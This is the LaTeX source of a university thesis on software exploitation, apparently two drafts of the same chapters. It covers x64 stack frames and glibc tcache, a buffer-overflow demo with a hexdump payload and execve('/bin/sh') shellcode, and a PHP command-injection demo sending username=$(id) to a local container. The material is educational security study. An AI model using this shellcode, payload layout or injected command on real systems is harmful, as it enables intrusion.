Software Exploitation and Beyond: Unveiling Attack Vectors and Countermeasures in Modern Computing

### 2023-07-02 paper.tex
final actually

\documentclass{article}
\usepackage{tikz}
\usetikzlibrary{matrix,shapes,arrows,positioning,decorations.pathreplacing,arrows.meta}
\usepackage{comment}
\usepackage{marginnote}
\usepackage{pgf}
\usepackage{xstring}
\usepackage{listings}
\usepackage{xcolor}
\usepackage[margin=2.54cm]{geometry}
\usepackage[utf8]{inputenc}
\usepackage[english]{babel}
\usepackage{float}
\usepackage[toc,page]{appendix}

\usepackage[backend=biber,style=numeric]{biblatex}

@@

@@

\title{Exploatarea Software și Mai Departe: Dezvăluirea Vectorilor de Atac și Contra-Măsurilor în Calculul Modern / Software Exploitation and Beyond: Unveiling Attack Vectors and Countermeasures in Modern Computing}
\maketitle

@@

Software exploitation continues to pose a significant threat to global cybersecurity, with vulnerabilities in software systems offering fertile ground for cyberattacks. The expanding complexity of contemporary software and the incessantly evolving threat landscape only accentuates the magnitude of the problem. This paper will discuss the concept of software exploitation, elaborating on how attackers leverage vulnerabilities in software systems, illustrating some standard exploitation techniques, including buffer overflows, code injection, heap corruption, among others, while also exploring contemporary exploit detection and prevention methodologies, from static and dynamic analysis techniques to machine learning and artificial intelligence-based approaches, critically evaluating their strengths and weaknesses. Finally showcasing the necessity for a proactive approach toward software security, outlining the importance of secure coding practices and threat modeling in the early stages of software development lifecycle. In conclusion, this paper aims to offer an in-depth review of the current landscape of exploitation, detection and mitigation methodologies and techniques, emphasizing the criticality of these techniques in fortifying software against threats.

\section{Motivation}%
The ubiquity of digital devices in our daily lives has ushered in an era of unprecedented data accessibility and convenience. Yet, these conveniences also come with substantial security concerns. A significant proportion of the world's population carries a device in their pocket that is not only a communication device but also a gateway to their most personal and sensitive information, including bank accounts, biometrics, and other data of significant value. These devices, armed with cameras and microphones, could potentially be misused to impersonate their owners. With these threats looming, the importance of rigorous and effective exploit mitigation strategies, especially in system's programming, cannot be overstated. These mitigation strategies form the critical defensive layer that shields users from the consequences of potential security breaches, preventing unauthorized access, and securing the private sphere of individuals in the digital age. Hence, the motivation of this study is to evaluate, analyze, and enhance the robustness of these mitigation strategies, thereby contributing to safer and more secure software systems.

@@

\subsection{Mixing control data with user data}
The stack is a fundamental data structure in modern computing systems, and its use in x64 systems is exciting due to the specific features and operations enabled by the x64 architecture. The stack is typically organized as a contiguous memory region with two key pointers: the stack base pointer (RBP in x64) and the stack pointer (RSP in x64). The stack grows `downward' in memory, meaning that as new items are pushed onto the stack, the stack pointer decreases in value. A typical function call on an x64 system involves pushing the return address onto the stack, followed by the function's parameters \footnote{In the most common calling convention, the first few parameters are passed in registers, not through the stack}, and finally, the local variables. These elements are popped from the stack in reverse order upon function return, ensuring correct program execution. However, the direct memory access afforded by the stack also presents a potential vector for exploitation, with techniques such as buffer overflow attacks targeting this fundamental structure. Consequently, understanding the stack's functioning in x64 systems is crucial for building and securing software systems.

@@

An example state of the stack during the call~\footnote{This example is used for simplicity. In real world scenarios the variables would have been constant propagated and the function would have directly returned the result of the computation} to the function `example` Listing~\ref{lst:examplefn} is shown in Figure~\ref{fig:stackfame-example}.

We can see that the stack frame contains some interesting values that we haven't defined ourselves:
\begin{itemize}
  \item \textbf{RBP} -~Base pointer. This has been historically used to keep
        track of the start (or base) of our function's stack frame. Functions are usually not allowed to modify values above this address.
  \item \textbf{Old RBP} -~Base pointer of the caller.
  \item \textbf{Stack canary} -~A random value. The purpose of this is discussed in a later chapter.
  \item \textbf{Return address} -~For our purposes this is the most important variable. This value is used by the callee to return (hence return address) the execution flow back to the caller when the function finished executing. Another important fact is that this value is stored in the same area as our variables.
\end{itemize}

@@

Now that we understand how a stack frame looks, we can move on to how stack frames are linked together. Figure~\ref{fig:stacksample} shows the state of the stack while executing the following nested function call chain~\footnote{Assuming that foo does not return} (the `calls' operation is denoted by '$\Rightarrow$`):

@@

This structure is a singly linked list of stack frames, with \emph{RBP} as their forward pointer. The function the processor executes is at the head of the list, and the first function called by the program is situated at the tail. Because user variables are mixed with control structures, we can imagine the outcome if we managed to corrupt the \emph{forward} pointer in this linked list.

@@

\subsubsection{free}
The \emph{free} function pretty much does the inverse of what malloc does. It marks the memory allocation starting at the address given as a parameter as free for use by the allocator. The algorithm behind the dynamic memory allocation API is left to be implementation-defined. We will dig deeper into the allocator used by LibC on the GNU/Linux operating system.

\subsection{Allocating memory in Linux}
The allocator used by the C standard library (GLibC) on Linux is a variation of \emph{ptmalloc}. There are two main ways to allocate memory using this allocator. The allocator automatically chooses which technique to use based on the size of the requested allocation\footnote{We will be referring to allocations with a size $<$ {M\_MMAP\_THRESHOLD} as \emph{small} and to allocations larger than that as \emph{big}}\footnote{{M\_MMAP\_THRESHOLD} is set to 127k bytes by default}:
\begin{itemize}
  \item \emph{small}~-~served by the allocation algorithm
  \item \emph{large}~-~served by a call to \emph{mmap}
\end{itemize}

Large allocations bypass the allocation algorithm entirely (and will not be the focus of our exploitation scenarios), unlike small allocations, which pass through a pretty complex set of steps before the memory is given to us. We will discuss this algorithm in detail, highlighting areas of interest that will help us develop exploits and mitigations later.

The allocation algorithm is described in depth in~\cite{MallocInternals}. We will mainly be exploring the \emph{tcache} part of the algorithm.

@@

\texttt{tcache} intercepts the calls made to the \emph{free} function and stores these allocations in singly linked lists named tcache buckets. Each bucket can store a range of allocation sizes. When calling \emph{malloc} with tcache enabled, the first step is to check the appropriately sized tcache bucket for an allocation that might satisfy our requirements. If an allocation is found, it is removed from the singly linked list and returned.

@@

The example in Figure~\ref{fig:tcache} is a sample tcache state after executing the following instruction sequqence:
\begin{enumerate}
  \item $free(alloc_{2})$
  \item $free(alloc_{0})$
  \item $free(alloc_{1})$
\end{enumerate}
Let's say we want to make an allocation that would fit inside $bucket_{0}$. The tcache algorithm would pull out that allocation from the list and return it to us, while updating the head of the list with the address of $alloc_{0}$.

@@

    \draw[->] (m3-1-1) -- (m2-1-1);
    \draw[->] (m3-1-3) -- (m2-1-3);
  \end{tikzpicture}
  \caption{\label{fig:tcache} Sample tcache state after malloc}%
\end{figure}

@@

\section{Software Exploitation Techniques}%
Software exploitation has been a prevalent issue almost as early as the inception of software itself, underpinning the need for constant vigilance and innovation in software security. Early instances of software exploitation can be traced back to the late 1980s with the advent of the Morris Worm. Considered one of the first computer worms distributed via the Internet, the Morris Worm infected approximately 6,000 computers, causing significant slowdowns or rendering them unusable \cite{spafford1989internet}. Since then, various software vulnerabilities have been exploited, including buffer overflows, injection attacks, and privilege escalation, leading to massive data breaches, service disruptions, and significant financial losses \cite{owasp2017}. The history of software exploitation elucidates the perpetual arms race between attackers seeking to exploit vulnerabilities and defenders striving to secure systems. This dynamic continues to define the software security landscape today.

\subsection{Early stage}
\subsubsection{Shellcoding}
\begin{comment}
  shellcoding
  reference smashing the stack for fun and profit
\end{comment}
One of the earliest vulnerabilities that were exploited was the buffer overflow. A Buffer overflow represents a crucial class of software vulnerabilities that can serve as a launching pad for a myriad of complex exploits, one of which includes shellcode injection. This vulnerability arises when more data is written to a buffer than it can hold, allowing an attacker to overwrite adjacent memory locations \cite{seacord2013}. If exploited judiciously, this can alter the program's control flow, enabling an attacker to execute arbitrary code. One manifestation of this is shellcoding, where an attacker injects a sequence of bytes, often encoding command-line shell instructions, into the memory and manipulates the program's execution flow to execute this code \cite{one1996smashing}. This capability to execute arbitrary code gives the attacker complete control over the compromised system, illustrating the severity and implications of buffer overflow vulnerabilities.

Below \ref{lst:bof} is an example of a vulnerable program.

@@

But running the program with the following malicious crafted input we get a vastly different result\footnote{This would not happen in modern compilers because of mitigations enabled by default. The exact compilation flags required for this attack were: \texttt{-fno-stack-protector -z execstack -fno-pic -no-pie}}:
\begin{lstlisting}[caption={Shellcode execution}
      ,label={lst:bof_malicious}
      ,language=bash]
# The `cat` command is used just to keep
# the stdin of the `say_hi` program open
$ cat shellcode_malicious_input.bin - | ./say_hi
aaaa
Hi !
ls
Makefile  say_hi  shellcode_malicious_input.bin
\end{lstlisting}

\begin{lstlisting}[caption={Hexdump of malicious input}
      ,label={lst:bof_malicous_hex}
      ,language=bash]
0000000 0000 0000 0000 0000 0000 0000 0000 0000
*
0000100 0000 0000 0000 0000 115a 0040 0000 0000
0000110 9090 9090 9090 9090 9090 9090 9090 9090
*
0000310 8148 80ec 0000 6a00 4868 2fb8 6962 2f6e
0000320 2f2f 5073 8948 68e7 6972 0101 3481 0124
0000330 0101 3101 56f6 086a 485e e601 4856 e689
0000340 d231 3b6a 0f58 0005
0000347
\end{lstlisting}
Our simple program behaves like a system shell. We will now analyze what happened during the execution of our program. Here,~\ref {lst:bof_malicous_hex} is a hex dump of the input. Let us break it down:
\begin{enumerate}
  \item The first 0x100 bytes of the payload are just null bytes\footnote{We are allowed to do this because \emph{gets} does not stop reading the string when it encounters a \emph{NULL} (0) byte, even though strings in C are almost always NULL terminated.~\emph{scanf} will only return when it encounters an error or reads a line ending}. We do this in order to fill up the buffer that the application uses. These values could be anything (besides line endings).
  \item As shown in\ref{veziacistackuala} we now need to overflow the \emph{base pointer}. This exploitation scenario allows us to place any value instead of the saved rbp (because it is not used), but it can allow us to pivot the stack into some memory address we know in some cases.
  \item Now we overwrite the \emph{return address} to point to the address of the \emph{jump rsp} instruction.
  \item After the return address, we place a \emph{nop sled}. The purpose of the nop sled is to allow us some leeway\footnote{When jumping into shellcode written to the stack, the addresses the stack register and instruction pointer point to are close together. Stack manipulations (such as \emph{push}es and \emph{pop}s) can overwrite the shellcode, causing it to misbehave or making the processor execute illegal instructions.} when crafting the actual malicious payload.
  \item Finally, we place the instructions we want to execute. The payload exemplified\ref{vezipayload} here uses the \emph{execve} syscall to replace the current running process with the \emph{sh} shell process.
\end{enumerate}

This traditional exploitation technique of buffer overflow into shellcode has been effectively mitigated by a plethora of defensive mechanisms that we will discuss in subsequent chapters, such as Address Space Layout Randomization (ASLR), Data Execution Prevention (DEP), Stack Canaries, Control-Flow Integrity (CFI). Despite these advancements, the described exploitation scenarios retain relevance in contexts where these protection measures are absent or cannot be implemented. For example, systems lacking a Memory Management Unit (MMU), many embedded systems, and specific router configurations may not have these defenses, leaving them susceptible to such attacks. Thus, understanding these exploits remains critical in a comprehensive approach to system security.

@@

  \end{tikzpicture}
  \caption{\label{fig:label} State of the stack before executing \emph{gets} in the function \emph{say\_hi}}%
  \label{fig:stackframe}
\end{figure}

\begin{lstlisting}[caption={Shellcode disassembly}
      ,label={lst:bof}
      ,language={[x86masm]Assembler}]
    /* execve(path='/bin///sh', argv=['sh'], envp=0) */
    /* push b'/bin///sh\x00' */
    push 0x68
    mov rax, 0x732f2f2f6e69622f
    push rax
    mov rdi, rsp
    /* push argument array ['sh\x00'] */
    /* push b'sh\x00' */
    push 0x1010101 ^ 0x6873
    xor dword ptr [rsp], 0x1010101
    xor esi, esi /* 0 */
    push rsi /* null terminate */
    push 8
    pop rsi
    add rsi, rsp
    push rsi /* 'sh\x00' */
    mov rsi, rsp
    xor edx, edx /* 0 */
    /* call execve() */
    push SYS_execve /* 0x3b */
    pop rax
    syscall
\end{lstlisting}

\subsubsection{Command injection}
Command injection vulnerabilities represent a pervasive class of security issues impacting web and system programming environments. These vulnerabilities occur when an application passes unsafe user-supplied data (forms, cookies, HTTP headers) to a system shell, allowing the attacker to execute arbitrary commands on the host operating system. In web applications, these flaws are primarily found in scripts that fail to properly sanitize user input, making them susceptible to cross-site scripting (XSS) and SQL injection attacks. However, command injection vulnerabilities are not confined to web programming; they are equally prevalent in systems programming. Poorly designed system applications and scripts that accept untrusted input for command execution can expose the system to similar attacks. This vulnerability, thus, underlines the importance of careful data handling and proper input validation, irrespective of the programming environment.

We will be walking through the following\ref{veziphpbapula} vulnerable PHP app. The application lacks proper input validation and allows an attacker to execute arbitrary commands. The use of the \emph{system} function will cause the following process to execute \texttt{sh -c ``echo Hello <username>''}\footnote{There are situations where we are not able to inject parameters into a command that will be directly reflected in the page. In these situations, we can try to end the intended command by using a \emph{;} character and then write our malicious command after.}. Our\ref{poggeroni} malicious request sets the \emph{username} parameter to \verb|$(id)|. Because the original command executes in a shell environment, the shell will interpret this string by forking itself, executing the string between the braces, and replacing the original string with the result of the command. We can imagine that we can cause havoc on the vulnerable machine by being able to execute any command we want.

\begin{minipage}{\linewidth}
\begin{lstlisting}[caption={Command Injection example}
      ,label={lst:bof}
      ,language=PHP]
<?php
    $username = $_GET['username'];
    system("echo Hello " . $username);
?>
\end{lstlisting}
\end{minipage}

\begin{lstlisting}[caption={Command Injection example}
      ,label={lst:bof}
      ,language=bash]
$ docker run -d -p 8080:80 command_injection_php
d58498277e1194cc46dac4009f8fca1c84ce02bea21008075ad53f77bd63202f
$ curl http://127.0.0.1:8080/hello\?username\=$\(id\)
Hello uid=33(www-data) gid=33(www-data) groups=33(www-data)
\end{lstlisting}
Command injection vulnerabilities can drastically undermine security measures. They enable attackers to bypass reverse proxies, offering unauthorized access to protected internal services. Moreover, such vulnerabilities can assist in creating botnets by allowing threat actors to inject commands to download and install malicious software, leading to potential large-scale cyber threats such as Distributed Denial of Service (DDoS) attacks.

The situation is similar in the systems programming space. The example of how a vulnerable program might look is left as an exercise for the reader.
\subsection{Evolution}
\begin{comment} ret2libc
  Mention the lack of mitigation
  Rise of heap based exploits due to browsers and JS
  Research some linux&windows kernel exploits
\end{comment}
As mitigation strategies have advanced in both hardware and software to counteract software exploitation, so too have the techniques used by threat actors, resulting in a continual escalation of sophistication. In response to hardening mechanisms such as stack canaries and NX bits, novel exploitation techniques have been developed to circumvent these defenses. Return Oriented Programming (ROP) and heap corruption exploits are prominent among these. ROP is a technique that leverages existing code fragments, known as "gadgets", in the binary to perform arbitrary computations, effectively sidestepping the constraints enforced by the NX bit. On the other hand, heap corruption exploits involve manipulating the metadata of memory management structures to induce undefined behavior, providing the means to execute arbitrary code or escalate privileges. This evolutionary process underscores the dynamic nature of the cybersecurity landscape and the perpetual challenge of maintaining software security in the face of evolving threats.

@@

The entry mechanism behind this technique is the same as in the code injection case. We overwrite the return address of the program with an address we control. However, this time instead of providing our shellcode, we use existing code mapped inside the address space of the vulnerable process (usually from within the binary itself or LibC\footnote{LibC is mapped in almost all processes running on a system}).

>>>>

\documentclass{article}
\usepackage{tikz}
\usetikzlibrary{matrix,shapes,arrows,positioning,decorations.pathreplacing,arrows.meta}
\usepackage{comment}
\usepackage{marginnote}
\usepackage{pgf}
\usepackage{xstring}
\usepackage{listings}
\usepackage{xcolor}
\usepackage[utf8]{inputenc}
\usepackage{csquotes}
\usepackage[english]{babel}
\usepackage{float}
\usepackage[toc,page]{appendix}

\usepackage[backend=biber,style=numeric]{biblatex}
\nocite{*}

@@

\makeatletter

\newcommand{\advisor}[1]{\def\@advisor{#1}}
\newcommand{\university}[1]{\def\@university{#1}}
\newcommand{\universityRO}[1]{\def\@universityRO{#1}}
\newcommand{\faculty}[1]{\def\@faculty{#1}}
\newcommand{\facultyRO}[1]{\def\@facultyRO{#1}}
\newcommand{\department}[1]{\def\@department{#1}}
\newcommand{\departmentRO}[1]{\def\@departmentRO{#1}}
\newcommand{\email}[1]{\def\@email{#1}}
\newcommand{\location}[1]{\def\@location{#1}}
\newcommand{\locationRO}[1]{\def\@locationRO{#1}}
\newcommand{\titleRO}[1]{\def\@titleRO{#1}}

\newcommand{\mi}[1]{\mathit{#1}}

\renewcommand{\maketitle}{
\begin{titlepage}
    \begin{center}
        {\LARGE \@university\\\@faculty\\\@department}

        \vspace{3em}

        \begin{tabular}{p{4cm}p{5.0cm}}
            \includegraphics[scale = 0.12]{images/upb-logo.jpg} & \includegraphics[scale = 0.12]{images/cs-logo.png}
        \end{tabular}

        \vspace{4em}

        {\Huge DIPLOMA PROJECT}

        \vspace{3em}

        {\Large \@title}

        \vspace{2em}

        {\Large \@author}

        {\normalsize \@email}
    \end{center}

    \vspace{6em}

    \begin{flushright}
        {\large \textbf{Thesis advisor:}\vspace{1em}\\\@advisor}
    \end{flushright}

    \vspace{5em}

    \begin{center}
        {\Large \textbf{\@location}}

        {\large \@date}
    \end{center}
    \newpage
\end{titlepage}
\begin{titlepage}
    \begin{center}
        {\LARGE \@universityRO\\\@facultyRO\\\@departmentRO}

        \vspace{3em}

        \begin{tabular}{p{4cm}p{5.0cm}}
            \includegraphics[scale = 0.12]{images/upb-logo.jpg} & \includegraphics[scale = 0.12]{images/cs-logo.png}
        \end{tabular}

        \vspace{4em}

        {\Huge PROIECT DE DIPLOMĂ}

        \vspace{3em}

        {\Large \@titleRO}

        \vspace{2em}

        {\Large \@author}

        {\normalsize \@email}
    \end{center}

    \vspace{6em}

    \begin{flushright}
        {\large \textbf{Coordonator științific:}\vspace{1em}\\\@advisor}
    \end{flushright}

    \vspace{5em}

    \begin{center}
        {\Large \textbf{\@locationRO}}

        {\large \@date}
    \end{center}
    \newpage
\end{titlepage}
}
\makeatother

\university{University Politehnica of Bucharest}
\universityRO{Universitatea Politehnica din București}
\faculty{Automatic Control and Computer Science}
\facultyRO{Facultatea de Automatică și Calculatoare}
\department{Computer Science and Engineering Department}
\departmentRO{Departamentul de Calculatoare}
\title{Software Exploitation and Beyond: Unveiling Attack Vectors and Countermeasures in Modern Computing}
\titleRO{Exploatarea Software și Mai Departe: Dezvăluirea Vectorilor de Atac și Contra-Măsurilor în Calculul Modern}
\author{Bud Liviu-Alexandru}
\email{budliviu@gmail.com}
\advisor{As.Ing. Ştefan-Dan CIOCÎRLAN}
\location{Bucharest}
\locationRO{București}
\date{2023}

@@

\maketitle
% \title{Exploatarea Software și Mai Departe: Dezvăluirea Vectorilor de Atac și Contra-Măsurilor în Calculul Modern / Software Exploitation and Beyond: Unveiling Attack Vectors and Countermeasures in Modern Computing}
% \maketitle

@@

\emph{Software exploitation} continues to pose a significant threat to global cybersecurity, with vulnerabilities in software systems offering fertile ground for cyberattacks. The expanding complexity of contemporary software and the incessantly evolving threat landscape only accentuates the magnitude of the problem. This paper will discuss the concept of software exploitation, elaborating on how attackers leverage vulnerabilities in software systems, illustrating some standard exploitation techniques, including buffer overflows, code injection, heap corruption, among others, while also exploring contemporary exploit detection and prevention methodologies, critically evaluating their strengths and weaknesses. Finally showcasing the necessity for a proactive approach toward software security, outlining the importance of secure coding practices and threat modeling in the early stages of software development lifecycle. In conclusion, this paper aims to offer an in-depth review of the current landscape of exploitation, detection and mitigation methodologies and techniques, emphasizing the criticality of these techniques in fortifying software against threats.

\section{Motivation}%
Digital devices have made data access and ease unprecedented. However, these conveniences raise serious security issues. A large section of the world's population carries a device in their pocket that can access their bank accounts, fingerprints, and other valuable data. These devices may imitate their owners using cameras and microphones. Exploit mitigation measures, especially in system development, are crucial with these risks. These mitigation measures protect consumers from security breaches and secure their digital privacy. This study evaluates, analyzes, and improves various mitigation measures to make software systems safer and more secure.

@@

\subsection{Mixing control data with user data}
The stack is a fundamental data structure in modern computing systems, and its use in x64 systems is exciting due to the specific features and operations enabled by the x64 architecture. The stack is typically organized as a contiguous memory region with two key pointers: the stack base pointer (RBP in x64) and the stack pointer (RSP in x64). The stack grows `downward' in memory, meaning that as new items are pushed onto the stack, the stack pointer decreases in value. A typical function call on an x64 system involves pushing the return address onto the stack, followed by the function's parameters \footnote{In the most common calling convention, the first few parameters are passed in registers, not through the stack}, and finally, the local variables. These elements are popped from the stack in reverse order upon function return, ensuring correct program execution. However, the direct memory access afforded by the stack also presents a potential vector for exploitation, with techniques such as buffer overflow attacks targeting this fundamental structure. Consequently, understanding the stack's functioning in x64 systems is crucial for building and securing software systems. The exploitation and proof of exploitability due to memory corruption have been formalized in~\cite{WeirdMachines}.

@@

An example state of the stack during the call\footnote{This example is used for simplicity. In real world scenarios the variables would have been constant propagated and the function would have directly returned the result of the computation} to the function `example` Listing~\ref{lst:examplefn} is shown in Figure~\ref{fig:stackfame-example}.

The stack frame contains some interesting values that were not declared in code:
\begin{itemize}
  \item \textbf{RBP} -~Base pointer. This has been historically used to keep
        track of the start (or base) of our function's stack frame. Functions are usually not allowed to modify values above this address.
  \item \textbf{Old RBP} -~Base pointer of the caller.
  \item \textbf{Stack canary} -~A random value. The purpose of this is discussed in a later chapter.
  \item \textbf{Return address} -~For our purposes this is the most important variable. This value is used by the callee to return (hence return address) the execution flow back to the caller when the function finished executing. Another important fact is that this value is stored in the same area as our variables.
\end{itemize}

@@

Taking into account the layout of a stack frame, this is how stack frames are linked together when calling nested functions. Figure~\ref{fig:stacksample} shows the state of the stack while executing the following nested function call chain~\footnote{Assuming that foo does not return} (the `calls' operation is denoted by '$\Rightarrow$`):

@@

This structure is a singly linked list of stack frames, with \emph{RBP} as their forward pointer. The function the processor executes is at the head of the list, and the first function called by the program is situated at the tail. Because user variables are mixed with control structures, corrupting the \emph{forward} pointer could lead to crashes or even exploits.

@@

\subsubsection{free}
The \emph{free} function pretty much does the inverse of what malloc does. It marks the memory allocation starting at the address given as a parameter as free for use by the allocator. The algorithm behind the dynamic memory allocation API is left to be implementation-defined.

\subsection{Allocating memory in Linux}
The allocator used by the C standard library (GLibC) on Linux is a variation of \emph{ptmalloc}. There are two main ways to allocate memory using this allocator. The allocator automatically chooses which technique to use based on the size of the requested allocation\footnote{Allocations with a size $<$ {M\_MMAP\_THRESHOLD} aare\emph{small} and allocations larger than that are \emph{big}}\footnote{{M\_MMAP\_THRESHOLD} is set to 127k bytes by default}:
\begin{itemize}
  \item \emph{small}~-~served by the allocation algorithm
  \item \emph{large}~-~served by a call to \emph{mmap}
\end{itemize}

Large allocations bypass the allocation algorithm entirely (and will not be the focus of our exploitation scenarios), unlike small allocations, which pass through a pretty complex set of steps before the memory is given to us. This algorithm will be discussed in detail, highlighting areas of interest helpful for exploit and mitigation development.

For futher reading, the allocation algorithm is described in depth in~\cite{MallocInternals}.

@@

\texttt{tcache} intercepts the calls made to the \emph{free} function and stores these allocations in singly linked lists named ``tcache buckets''. Each bucket can store a range of allocation sizes. When calling \emph{malloc} with tcache enabled, the first step is to check the appropriately sized tcache bucket for an allocation that might satisfy our requirements. If an allocation is found, it is removed from the singly linked list and returned.

@@

The example in Figure~\ref{fig:tcache} is a sample tcache state after executing the following instruction sequqence:
\begin{enumerate}
  \item $free(alloc_{2})$
  \item $free(alloc_{0})$
  \item $free(alloc_{1})$
\end{enumerate}
Assume that an allocation that would fit inside $bucket_{0}$ is made. The tcache algorithm would talke out that allocation from the list and return it to the program, while updating the head of the list with the address of $alloc_{0}$.

@@

    \draw[->] (m3-1-1) -- (m2-1-1);
    \draw[->] (m3-1-3) -- (m2-1-3);
  \end{tikzpicture}
  \caption{\label{fig:tcache2} Sample tcache state after malloc}%
\end{figure}

@@

\section{Software Exploitation Techniques}%
Software exploitation has been a prevalent issue almost as early as the inception of software itself, underpinning the need for constant vigilance and innovation in software security. Early instances of software exploitation can be traced back to the late 1980s with the advent of the Morris Worm. Considered one of the first computer worms distributed via the Internet, the Morris Worm infected approximately 6,000 computers, causing significant slowdowns or rendering them unusable. Since then, various software vulnerabilities have been exploited, including buffer overflows, injection attacks, and privilege escalation, leading to massive data breaches, service disruptions, and significant financial losses . The history of software exploitation elucidates the perpetual arms race between attackers seeking to exploit vulnerabilities and defenders striving to secure systems. This dynamic continues to define the software security landscape today.

\subsection{Early stage}
\subsubsection{Shellcoding}
\begin{comment}
  shellcoding
  reference smashing the stack for fun and profit
\end{comment}
One of the earliest vulnerabilities that were exploited was the buffer overflow. A Buffer overflow represents a crucial class of software vulnerabilities that can serve as a launching pad for a myriad of complex exploits, one of which includes shellcode injection. This vulnerability arises when more data is written to a buffer than it can hold, allowing an attacker to overwrite adjacent memory locations. If exploited judiciously, this can alter the program's control flow, enabling an attacker to execute arbitrary code. One manifestation of this is shellcoding, where an attacker injects a sequence of bytes, often encoding command-line shell instructions, into the memory and manipulates the program's execution flow to execute this code \cite{alephone}. This capability to execute arbitrary code gives the attacker complete control over the compromised system, illustrating the severity and implications of buffer overflow vulnerabilities.

Code for the vulnerable program used is available at Annex~\ref{lst:bof-sample}.

@@

But running the program with the following malicious crafted input a vastly different result\footnote{This would not happen in modern compilers because of mitigations enabled is displayed. The exact compilation flags required for this attack were: \texttt{-fno-stack-protector -z execstack -fno-pic -no-pie}}:
\begin{lstlisting}[caption={Shellcode execution}
      ,label={lst:bof_malicious}
      ,language=bash]
# The `cat` command is used just to keep
# the stdin of the `say_hi` program open
$ cat shellcode_malicious_input.bin - | ./say_hi
aaaa
Hi !
ls
Makefile  say_hi  shellcode_malicious_input.bin
\end{lstlisting}

\begin{lstlisting}[caption={Hexdump of malicious input}
      ,label={lst:bof_malicous_hex}
      ,language=bash]
0000000 0000 0000 0000 0000 0000 0000 0000 0000
*
0000100 0000 0000 0000 0000 115a 0040 0000 0000
0000110 9090 9090 9090 9090 9090 9090 9090 9090
*
0000310 8148 80ec 0000 6a00 4868 2fb8 6962 2f6e
0000320 2f2f 5073 8948 68e7 6972 0101 3481 0124
0000330 0101 3101 56f6 086a 485e e601 4856 e689
0000340 d231 3b6a 0f58 0005
0000347
\end{lstlisting}
The program behaves like a system shell. Listing ~\ref{lst:bof_malicous_hex} shows the payload used in \emph{hexdump} form. 
\begin{enumerate}
  \item \texttt{0000000-0000100} null bytes\footnote{\emph{gets} does not stop reading the string when it encounters a \emph{NULL} (0) byte, even though C strings NULL terminated.~\emph{scanf} will stop consuming input only when it encounters an error or a line break}.
  \item \texttt{0000100-0000108} overflowed \emph{base pointer} This exact exploitation scenario does not impose any restrictions on the overflowed value of the base pointer.
  \item \texttt{0000108-0000110} overflowed \emph{return address}, now containing the address of the \emph{jump rsp} gadget
  \item \texttt{0000110-0000310} \emph{nop sled}, giving the attacker leeway when choosing the return address.
  \item \texttt{0000110-0000310} shellcode at Listing ~\ref{lst:bofshell} calling the \emph{execve} function with the arguments: ``/bin/sh"", NULL, NULL, granting the attacker a shell on the system
\end{enumerate}

This traditional exploitation technique of buffer overflow to shellcode has been effectively mitigated by a multitude of defensive mechanisms, which will be discussed in subsequent chapters. These mechanisms include \emph{Address Space Layout Randomization} (ASLR), \emph{Data Execution Prevention} (DEP), \emph{Stack Canaries}, and \emph{Control-Flow Integrity} (CFI). Despite these developments, the exploitative scenarios that were outlined are still applicable in settings in which the protective mechanisms stated above are either not present or cannot be adopted. For example, systems that do not have a \emph{Memory Management Unit} (MMU), a large number of embedded systems, and some router configurations may lack these safeguards, leaving them susceptible to assaults of this kind. It is still essential for a complete system security plan to have a solid understanding of these attacks.

@@

  \end{tikzpicture}
  \caption{\label{fig:stackframe} State of the stack before executing \emph{gets} in the function \emph{say\_hi}}%
\end{figure}

\begin{lstlisting}[caption={Shellcode disassembly}
      ,label={lst:bofshell}
      ,language={[x86masm]Assembler}]
    /* execve(path='/bin///sh', argv=['sh'], envp=0) */
    /* push b'/bin///sh\x00' */
    push 0x68
    mov rax, 0x732f2f2f6e69622f
    push rax
    mov rdi, rsp
    /* push argument array ['sh\x00'] */
    /* push b'sh\x00' */
    push 0x1010101 ^ 0x6873
    xor dword ptr [rsp], 0x1010101
    xor esi, esi /* 0 */
    push rsi /* null terminate */
    push 8
    pop rsi
    add rsi, rsp
    push rsi /* 'sh\x00' */
    mov rsi, rsp
    xor edx, edx /* 0 */
    /* call execve() */
    push SYS_execve /* 0x3b */
    pop rax
    syscall
\end{lstlisting}

\subsubsection{Command injection}
Command injection vulnerabilities are pervasive in web and system programming environments. These flaws occur when an application passes unsecure user-supplied data (forms, cookies, HTTP headers) to a system shell, allowing an attacker to execute arbitrary commands on the host operating system.

\emph{Cross-site scripting} (XSS) and \emph{SQL injection} vulnerabilities are most prevalent in web applications with scripts that fail to properly sanitize user input, making them susceptible to such attacks.
However, command injection vulnerabilities are prevalent in systems programming as well as web programming. Applications and programs that accept untrusted input for command execution and are poorly designed can expose the system to similar attacks. This vulnerability highlights the significance of careful data management and input validation regardless of the programming environment.

Such an example of a vulnerable app is shown in Listing~\ref{lst:phpinject}. The application lacks proper input validation and allows an attacker to execute arbitrary commands due to use of the \emph{system} function. The malicious request at Listing~\ref{lst:cmdinj} sets the \emph{username} parameter to \verb|$(id)|, causing the system shell called by the \emph{system} PHP function to interpret the username as a subcommand, interpolating the output into the original command.

\begin{minipage}{\linewidth}
\begin{lstlisting}[caption={Command Injection example}
      ,label={lst:phpinject}
      ,language=PHP]
<?php
    $username = $_GET['username'];
    system("echo Hello " . $username);
?>
\end{lstlisting}
\end{minipage}

\begin{lstlisting}[caption={Command Injection example}
      ,label={lst:cmdinj}
      ,language=bash]
$ docker run -d -p 8080:80 command_injection_php
d58498277e1194cc46dac4009f8fca1c84ce02bea21008075ad53f77bd63202f
$ curl http://127.0.0.1:8080/hello\?username\=$\(id\)
Hello uid=33(www-data) gid=33(www-data) groups=33(www-data)
\end{lstlisting}
Command injection vulnerabilities can drastically undermine security measures. They enable attackers to bypass reverse proxies, offering unauthorized access to protected internal services. Moreover, such vulnerabilities can assist in creating botnets by allowing threat actors to inject commands to download and install malicious software, leading to potential large-scale cyber threats such as Distributed Denial of Service (DDoS) attacks.

The situation is similar in the systems programming space. The example of how a vulnerable program might look is left as an exercise for the reader.

\subsection{Evolution}
As mitigation strategies have advanced in both hardware and software to counteract software exploitation, so too have the techniques used by threat actors, resulting in a continual escalation of sophistication. In response to hardening mechanisms such as stack canaries and NX bits, novel exploitation techniques have been developed to circumvent these defenses. \emph{Return Oriented Programming} (ROP) and heap corruption exploits are prominent among these. ROP is a technique that leverages existing code fragments, known as "gadgets", in the binary to perform arbitrary computations, effectively sidestepping the constraints enforced by the \emph{NX} bit.

On the other hand, heap corruption exploits involve manipulating the metadata of memory management structures to induce undefined behavior, providing the means to execute arbitrary code or escalate privileges. This evolutionary process underscores the dynamic nature of the cybersecurity landscape and the perpetual challenge of maintaining software security in the face of evolving threats.

@@

